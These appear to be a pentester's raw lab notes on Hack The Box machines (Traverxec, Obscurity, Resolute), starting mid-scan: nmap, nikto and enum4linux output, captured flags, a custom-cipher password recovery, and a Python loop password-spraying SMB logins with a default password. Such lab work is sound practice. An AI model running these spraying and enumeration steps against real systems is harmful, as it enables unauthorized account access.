11:31:09 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: nostromo 1.9.6<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ ERROR: Error limit (20) reached for host, giving up. Last error: <br />+ Scan terminated:  1 error(s) and 3 item(s) reported on remote host<br />+ End Time:           2020-01-16 11:35:35 (GMT-5) (266 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br />root@kali:~/Desktop/Machines/HTB/Traverxec# <br /></div><div class='page'><h1 class='title level-5'>Flags</h1><br/>user<br />7db0b48469606a42cec20750d9782f3d<br />root<br />9aa36a6d76f785dfd320a478f6e0d906<br /><br /><br /><a href="https://github.com/JoeNibe/blog/tree/gh-pages/_posts/htb">https://github.com/JoeNibe/blog/tree/gh-pages/_posts/htb</a></div><div class='page'><h1 class='title level-4'>10.10.10.168 Obscurity</h1><br/><a href=""><img src="images/814-1.png" alt="images/814-1.png" /></a><br />&quot;&quot;&quot;<br />www-data@obscure:/home/robert$ cat check.txt<br />Encrypting this file with your key should result in out.txt, make sure your key is correct!<br /><br />www-data@obscure:/home/robert$ cat out.txt<br />¦ÚÈêÚÞØÛÝÝ      ×ÐÊß<br />ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ<br />êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè     ÎÍÚÎëÑÓäáÛÌ×<br /><br />www-data@obscure:/home/robert$ cat passwordreminder.txt<br />´ÑÈÌÉàÙÁÑé¯·¿kwww-data@obscure:/home/robert$<br /><br />www-data@obscure:/home/robert$ cat SuperSecureCrypt.py<br />&quot;&quot;&quot;<br />#python3 SuperSecureCrypt.py -i out.txt -o /tmp/key.txt -k &quot;$(cat check.txt)&quot; -d<br />&quot;&quot;&quot;<br />www-data@obscure:/home/robert$ cat /tmp/key.txt<br />alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai<br />&quot;&quot;&quot;<br />#python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/passwd.txt -k alexandrovich -d<br />&quot;&quot;&quot;<br />cat /tmp/passwd.txt<br />SecThruObsFTW<br />&quot;&quot;&quot;<br />#ssh robert@10.10.10.168<br />User.txt<br /><br /><br />sudo -l<br />/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py<br /><br />mkdir /tmp/SSH<br />run the command<br />look in /tmp/SSH<br />its a hash for root, decrypt it and su root<br />rooted.<br /></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><h1>openssh-server 1:7.6p1-4 (amd64 binary) in ubuntu bionic</h1><br /><br />Message to server devs: the current source code for the web server is in &#39;SuperSecureServer.py&#39; in the secret development directory<br />wfuzz  -w /usr/share/wordlists/dirb/common.txt --hc 404,500 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py<br /><a href="http://10.10.10.168:8080/develop/SuperSecureServer.py">http://10.10.10.168:8080/develop/SuperSecureServer.py</a><br />                ^SquidsWfuzzTool<br /><br /><br />privesc... connect to 9000 with nc ?</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=63e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a> ; nmap -Pn 10.10.10.168 &amp;&amp; nmap -sC -sV -Pn 10.10.10.168 &amp;&amp; nmap -p- -Pn 10.10.10.168<br />ttl=63<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-17 16:10 EDT<br />Nmap scan report for 10.10.10.168<br />Host is up (0.31s latency).<br />Not shown: 996 filtered ports<br />PORT     STATE  SERVICE<br />22/tcp   open   ssh<br />80/tcp   closed http<br />8080/tcp open   http-proxy<br />9000/tcp closed cslistener<br /><br />Nmap done: 1 IP address (1 host up) scanned in 19.50 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-17 16:11 EDT<br />Nmap scan report for 10.10.10.168<br />Host is up (0.30s latency).<br />Not shown: 996 filtered ports<br />PORT     STATE  SERVICE    VERSION<br />22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)<br />|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)<br />|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)<br />80/tcp   closed http<br />8080/tcp open   http-proxy BadHTTPServer<br />| fingerprint-strings: <br />|   GetRequest, HTTPOptions: <br />|     HTTP/1.1 200 OK<br />|     Date: Fri, 17 Apr 2020 20:11:29<br />|     Server: BadHTTPServer<br />|     Last-Modified: Fri, 17 Apr 2020 20:11:29<br />|     Content-Length: 4171<br />|     Content-Type: text/html<br />|     Connection: Closed<br />|     &lt;!DOCTYPE html&gt;<br />|     &lt;html lang=&quot;en&quot;&gt;<br />|     &lt;head&gt;<br />|     &lt;meta charset=&quot;utf-8&quot;&gt;<br />|     &lt;title&gt;0bscura&lt;/title&gt;<br />|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;<br />|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;<br />|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;<br />|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;<br />|     &lt;!-- <br />|     Easy Profile Template<br />|     <a href="http://www.templatemo.com/tm-467-easy-profile">http://www.templatemo.com/tm-467-easy-profile</a><br />|     &lt;!-- stylesheet css --&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;<br />|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;<br />|     &lt;/head&gt;<br />|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;<br />|     &lt;!-- preloader section --&gt;<br />|     &lt;!--<br />|     &lt;div class=&quot;preloader&quot;&gt;<br />|_    &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;<br />|_http-server-header: BadHTTPServer<br />|_http-title: 0bscura<br />9000/tcp closed cslistener<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port8080-TCP:V=7.80%I=7%D=4/17%Time=5E9A0D82%P=x86_64-pc-linux-gnu%r(Ge<br />SF:tRequest,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x20Fri,\x2017\x20Apr\x2020<br />SF:20\x2020:11:29\nServer:\x20BadHTTPServer\nLast-Modified:\x20Fri,\x2017\<br />SF:x20Apr\x202020\x2020:11:29\nContent-Length:\x204171\nContent-Type:\x20t<br />SF:ext/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;<br />SF:en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;\<br />SF:n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=Edge\&quot;&gt;\n\t&lt;<br />SF:meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-s<br />SF:cale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20content=\&quot;\&quot;&gt;\n\t&lt;meta\x20na<br />SF:me=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Templ<br />SF:ate\n<a href="http://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20st">http://www\.templatemo\.com/tm-467-easy-profile\n--&gt;\n\t&lt;!--\x20st</a><br />SF:ylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/boo<br />SF:tstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/font-a<br />SF:wesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/templa<br />SF:temo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&quot;scroll\&quot;\x20data-target<br />SF:=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n&lt;<br />SF:div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;sk-spinner\x20sk-spinner<br />SF:-wordpress\&quot;&gt;\n&quot;)%r(HTTPOptions,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x20<br />SF:Fri,\x2017\x20Apr\x202020\x2020:11:29\nServer:\x20BadHTTPServer\nLast-M<br />SF:odified:\x20Fri,\x2017\x20Apr\x202020\x2020:11:29\nContent-Length:\x204<br />SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20<br />SF:html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t<br />SF:&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20co<br />SF:ntent=\&quot;IE=Edge\&quot;&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=dev<br />SF:ice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20conte<br />SF:nt=\&quot;\&quot;&gt;\n\t&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\nE<br />SF:asy\x20Profile\x20Template\n<a href="http://www\.templatemo\.com/tm-467-easy-pro">http://www\.templatemo\.com/tm-467-easy-pro</a><br />SF:file\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;stylesh<br />SF:eet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet<br />SF:\&quot;\x20href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet<br />SF:\&quot;\x20href=\&quot;css/templatemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&quot;<br />SF:scroll\&quot;\x20data-target=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x20<br />SF:section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;s<br />SF:k-spinner\x20sk-spinner-wordpress\&quot;&gt;\n&quot;);<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 59.20 seconds<br />Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-04-17 16:12 EDT<br />Nmap scan report for 10.10.10.168<br />Host is up (0.27s latency).<br />Not shown: 65531 filtered ports<br />PORT     STATE  SERVICE<br />22/tcp   open   ssh<br />80/tcp   closed http<br />8080/tcp open   http-proxy<br />9000/tcp closed cslistener<br /><br />Nmap done: 1 IP address (1 host up) scanned in 766.64 seconds<br /></div><div class='page'><h1 class='title level-5'>flags</h1><br/>user<br />e4493782066b55fe2755708736ada2d7<br />root<br />512fd4429f33a113a44d5acde23609e3</div><div class='page'><h1 class='title level-4'>10.10.10.169 Resolute</h1><br/>evil-winrm got me a user shell<br /><br />the exploit is that polarbear thing but gets busted by anti-virus. </div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>Marko Novak     Welcome123!     marko<br />melanie Welcome123!     melanie</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>echo -e e[5me[31me[1mttl=127e[0m; echo <a href="http://www.kellyodonnell.com/content/determining-os-type-ping;">http://www.kellyodonnell.com/content/determining-os-type-ping;</a> nmap 10.10.10.169<br />ttl=127<br /><a href="http://www.kellyodonnell.com/content/determining-os-type-ping">http://www.kellyodonnell.com/content/determining-os-type-ping</a><br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-17 11:07 EST<br />Nmap scan report for 10.10.10.169<br />Host is up (0.090s latency).<br />Not shown: 989 closed ports<br />PORT     STATE SERVICE<br />53/tcp   open  domain<br />88/tcp   open  kerberos-sec<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />389/tcp  open  ldap<br />445/tcp  open  microsoft-ds<br />464/tcp  open  kpasswd5<br />593/tcp  open  http-rpc-epmap<br />636/tcp  open  ldapssl<br />3268/tcp open  globalcatLDAP<br />3269/tcp open  globalcatLDAPssl<br /><br />Nmap done: 1 IP address (1 host up) scanned in 10.16 seconds<br /></div><div class='page'><h1 class='title level-6'>big nmap</h1><br/>nmap -sC -sV -p- 10.10.10.169<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-17 11:08 EST<br />Nmap scan report for 10.10.10.169<br />Host is up (0.090s latency).<br />Not shown: 65511 closed ports<br />PORT      STATE SERVICE      VERSION<br />53/tcp    open  domain?<br />| fingerprint-strings: <br />|   DNSVersionBindReqTCP: <br />|     version<br />|_    bind<br />88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-17 16:26:33Z)<br />135/tcp   open  msrpc        Microsoft Windows RPC<br />139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br />389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)<br />445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)<br />464/tcp   open  kpasswd5?<br />593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br />636/tcp   open  tcpwrapped<br />3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)<br />3269/tcp  open  tcpwrapped<br />5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />9389/tcp  open  mc-nmf       .NET Message Framing<br />47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br />|_http-server-header: Microsoft-HTTPAPI/2.0<br />|_http-title: Not Found<br />49664/tcp open  msrpc        Microsoft Windows RPC<br />49665/tcp open  msrpc        Microsoft Windows RPC<br />49666/tcp open  msrpc        Microsoft Windows RPC<br />49667/tcp open  msrpc        Microsoft Windows RPC<br />49671/tcp open  msrpc        Microsoft Windows RPC<br />49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br />49677/tcp open  msrpc        Microsoft Windows RPC<br />49688/tcp open  msrpc        Microsoft Windows RPC<br />49910/tcp open  msrpc        Microsoft Windows RPC<br />54084/tcp open  tcpwrapped<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port53-TCP:V=7.70%I=7%D=12/17%Time=5DF90022%P=i686-pc-linux-gnu%r(DNSVe<br />SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x<br />SF:04bind\0\0\x10\0\x03&quot;);<br />Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Host script results:<br />|_clock-skew: mean: 2h47m24s, deviation: 4h37m10s, median: 7m22s<br />| smb-os-discovery: <br />|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br />|   Computer name: Resolute<br />|   NetBIOS computer name: RESOLUTE\x00<br />|   Domain name: megabank.local<br />|   Forest name: megabank.local<br />|   FQDN: Resolute.megabank.local<br />|_  System time: 2019-12-17T08:27:26-08:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: required<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled and required<br />| smb2-time: <br />|   date: 2019-12-17 11:27:25<br />|_  start_date: 2019-12-17 09:40:15<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 861.44 seconds<br /></div><div class='page'><h1 class='title level-6'>DNS</h1><br/>Zone Transfer detected, no record recovered, added to hosts<br /><br />dnsrecon -d megabank.local -n 10.10.10.169 -a<br />[*] Performing General Enumeration of Domain: megabank.local<br />[*] Checking for Zone Transfer for megabank.local name servers<br />[*] Resolving SOA Record<br />[+] 	 SOA resolute.megabank.local 10.10.10.169<br />[*] Resolving NS Records<br />[*] NS Servers found:<br />[*] 	NS resolute.megabank.local 10.10.10.169<br />[*] Removing any duplicate NS server IP Addresses...<br />[*]  <br />[*] Trying NS server 10.10.10.169<br />[+] 10.10.10.169 Has port 53 TCP Open<br />[-] Zone Transfer Failed!<br />[-] No answer or RRset not for qname<br />[*] Checking for Zone Transfer for megabank.local name servers<br />[*] Resolving SOA Record<br />[+] 	 SOA resolute.megabank.local 10.10.10.169<br />[*] Resolving NS Records<br />[*] NS Servers found:<br />[*] 	NS resolute.megabank.local 10.10.10.169<br />[*] Removing any duplicate NS server IP Addresses...<br />[*]  <br />[*] Trying NS server 10.10.10.169<br />[+] 10.10.10.169 Has port 53 TCP Open<br />[-] Zone Transfer Failed!<br />[-] No answer or RRset not for qname<br />[-] DNSSEC is not configured for megabank.local<br />[*] 	 SOA resolute.megabank.local 10.10.10.169<br />[*] 	 NS resolute.megabank.local 10.10.10.169<br />[-] Could not Resolve MX Records for megabank.local<br />[*] 	 AAAA megabank.local dead:beef::b803:885a:b665:b183<br />[*] Enumerating SRV Records<br />[*] 	 SRV _ldap._tcp.megabank.local Resolute.megabank.local 10.10.10.169 389 100<br />[*] 	 SRV _gc._tcp.megabank.local Resolute.megabank.local 10.10.10.169 3268 100<br />[*] 	 SRV _kerberos._tcp.megabank.local Resolute.megabank.local 10.10.10.169 88 100<br />[*] 	 SRV _kerberos._udp.megabank.local Resolute.megabank.local 10.10.10.169 88 100<br />[*] 	 SRV _ldap._tcp.ForestDNSZones.megabank.local Resolute.megabank.local 10.10.10.169 389 100<br />[*] 	 SRV _ldap._tcp.dc._msdcs.megabank.local Resolute.megabank.local 10.10.10.169 389 100<br />[*] 	 SRV _ldap._tcp.pdc._msdcs.megabank.local Resolute.megabank.local 10.10.10.169 389 100<br />[*] 	 SRV _ldap._tcp.gc._msdcs.megabank.local Resolute.megabank.local 10.10.10.169 3268 100<br />[*] 	 SRV _kpasswd._tcp.megabank.local Resolute.megabank.local 10.10.10.169 464 100<br />[*] 	 SRV _kpasswd._udp.megabank.local Resolute.megabank.local 10.10.10.169 464 100<br />[*] 	 SRV _kerberos._tcp.dc._msdcs.megabank.local Resolute.megabank.local 10.10.10.169 88 100<br />[+] 11 Records Found<br /></div><div class='page'><h1 class='title level-6'>Kerberos Userlist</h1><br/>root@kali:~/Desktop/Machines/HTB/Resolute# nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;megabank.local&#39;,userdb=/usr/share/seclists/Usernames/Names/names.txt 10.10.10.169<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-12-17 11:30 EST<br />Nmap scan report for resolute.htb (10.10.10.169)<br />Host is up (0.092s latency).<br /><br />PORT   STATE SERVICE<br />88/tcp open  kerberos-sec<br />| krb5-enum-users: <br />| Discovered Kerberos principals<br />|     simon@megabank.local<br />|     zach@megabank.local<br />|     gustavo@megabank.local<br />|     claude@megabank.local<br />|     per@megabank.local<br />|     felicia@megabank.local<br />|     claire@megabank.local<br />|     fred@megabank.local<br />|     annette@megabank.local<br />|     stevie@megabank.local<br />|     angela@megabank.local<br />|     ulf@megabank.local<br />|     marcus@megabank.local<br />|     abigail@megabank.local<br />|     sally@megabank.local<br />|     annika@megabank.local<br />|     marko@megabank.local<br />|     melanie@megabank.local<br />|     paulo@megabank.local<br />|     ryan@megabank.local<br />|_    steve@megabank.local<br /></div><div class='page'><h1 class='title level-7'>smb loop</h1><br/>#!/bin/python3<br />import os<br />names = [<br />&quot;zach&quot;, &quot;gustavo&quot;, &quot;claude&quot;, &quot;per&quot;, &quot;felicia&quot;, &quot;claire&quot;, &quot;fred&quot;, &quot;annette&quot;, &quot;stevie&quot;, &quot;angela&quot;, &quot;ulf&quot;, &quot;marcus&quot;, &quot;abigail&quot;, &quot;sally&quot;, &quot;annika&quot;, &quot;marko&quot;, &quot;melanie&quot;, &quot;paulo&quot;<br />]<br />for name in names:<br />        print(name)<br />        os.system(&quot;smbmap -u {} -d megabank.local -p Welcome123! -H 10.10.10.169&quot;.format(name))<br /><br /><br />melanie Welcome123!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />Account name: MEGABANK\sunita<br />Account name: MEGABANK\abigail<br />Account name: MEGABANK\marcus<br />Account name: MEGABANK\sally<br />Account name: MEGABANK\fred<br />Account name: MEGABANK\angela<br />Account name: MEGABANK\felicia<br />Account name: MEGABANK\gustavo<br />Account name: MEGABANK\ulf<br />Account name: MEGABANK\stevie<br />Account name: MEGABANK\claire<br />Account name: MEGABANK\paulo<br />Account name: MEGABANK\steve<br />Account name: MEGABANK\annette<br />Account name: MEGABANK\annika<br />Account name: MEGABANK\per<br />Account name: MEGABANK\claude<br />Account name: MEGABANK\melanie<br />Account name: MEGABANK\zach<br />Account name: MEGABANK\simon<br />Account name: MEGABANK\naoki<br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 10.10.10.169 | tee e4lresults.txt<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Tue Dec 17 11:31:19 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.10.10.169<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ==================================================== <br />|    Enumerating Workgroup/Domain on 10.10.10.169    |<br /> ==================================================== <br />[E] Can&#39;t find workgroup/domain<br /><br /><br /> ============================================ <br />|    Nbtstat Information for 10.10.10.169    |<br /> ============================================ <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.<br />Looking up status of 10.10.10.169<br />No reply from 10.10.10.169<br /><br /> ===================================== <br />|    Session Check on 10.10.10.169    |<br /> ===================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.<br />[+] Server 10.10.10.169 allows sessions using username &#39;&#39;, password &#39;&#39;<br />[+] Got domain/workgroup name: <br /><br /> =========================================== <br />|    Getting domain SID for 10.10.10.169    |<br /> =========================================== <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.<br />Domain Name: MEGABANK<br />Domain Sid: S-1-5-21-1392959593-3013219662-3596683436<br />[+] Host is part of a domain (not a workgroup)<br /><br /> ====================================== <br />|    OS information on 10.10.10.169    |<br /> ====================================== <br />Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.<br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.<br />[+] Got OS info for 10.10.10.169 from smbclient: <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.<br />[+] Got OS info for 10.10.10.169 from srvinfo:<br />Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED<br /><br /> ============================= <br />|    Users on 10.10.10.169    |<br /> ============================= <br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.<br />index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail	Name: (null)	Desc: (null)<br />index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain<br />index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela	Name: (null)	Desc: (null)<br />index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette	Name: (null)	Desc: (null)<br />index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika	Name: (null)	Desc: (null)<br />index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire	Name: (null)	Desc: (null)<br />index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude	Name: (null)	Desc: (null)<br />index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount	Name: (null)	Desc: A user account managed by the system.<br />index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia	Name: (null)	Desc: (null)<br />index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred	Name: (null)	Desc: (null)<br />index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain<br />index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo	Name: (null)	Desc: (null)<br />index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account<br />index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus	Name: (null)	Desc: (null)<br />index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!<br />index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie	Name: (null)	Desc: (null)<br />index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki	Name: (null)	Desc: (null)<br />index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo	Name: (null)	Desc: (null)<br />index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per	Name: (null)	Desc: (null)<br />index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan	Name: Ryan Bertrand	Desc: (null)<br />index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally	Name: (null)	Desc: (null)<br />index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon	Name: (null)	Desc: (null)<br />index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve	Name: (null)	Desc: (null)<br />index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie	Name: (null)	Desc: (null)<br />index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita	Name: (null)	Desc: (null)<br />index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf	Name: (null)	Desc: (null)<br />index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach	Name: (null)	Desc: (null)<br /><br />Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.<br />user:[Administrator] rid:[0x1f4]<br />user:[Guest] rid:[0x1f5]<br />user:[krbtgt] rid:[0x1f6]<br />user:[DefaultAccount] rid:[0x1f7]<br />user:[ryan] rid:[0x451]<br />user:[marko] rid:[0x457]<br />user:[sunita] rid:[0x19c9]<br />user:[abigail] rid:[0x19ca]<br />user:[marcus] rid:[0x19cb]<br />user:[sally] rid:[0x19cc]<br />user:[fred] rid:[0x19cd]<br />user:[angela] rid:[0x19ce]<br />user:[felicia] rid:[0x19cf]<br />user:[gustavo] rid:[0x19d0]<br />user:[ulf] rid:[0x19d1]<br />user:[stevie] rid:[0x19d2]<br />user:[claire] rid:[0x19d3]<br />user:[paulo] rid:[0x19d4]<br />user:[steve] rid:[0x19d5]<br />user:[annette] rid:[0x19d6]<br />user:[annika] rid:[0x19d7]<br />user:[per] rid:[0x19d8]<br />user:[claude] rid:[0x19d9]<br />user:[melanie] rid:[0x2775]<br />user:[zach] rid:[0x2776]<br />user:[simon] rid:[0x2777]<br />user:[naoki] rid:[0x2778]<br /><br /> ========================================= <br />|    Share Enumeration on 10.10.10.169    |<br /> ========================================= <br />WARNING: The &quot;syslog&quot; option is deprecated<br />smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.169]<br /><br />	Sharename       Type      Comment<br />	---------       ----      -------<br />Error returning browse list: NT_STATUS_REVISION_MISMATCH<br />Reconnecting with SMB1 for workgroup listing.<br />Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br />Failed to connect with SMB1 -- no workgroup available<br /><br />[+] Attempting to map shares on 10.10.10.169<br /><br /> ==================================================== <br />|    Password Policy Information for 10.10.10.169    |<br /> ==================================================== <br />Use of uninitialized value 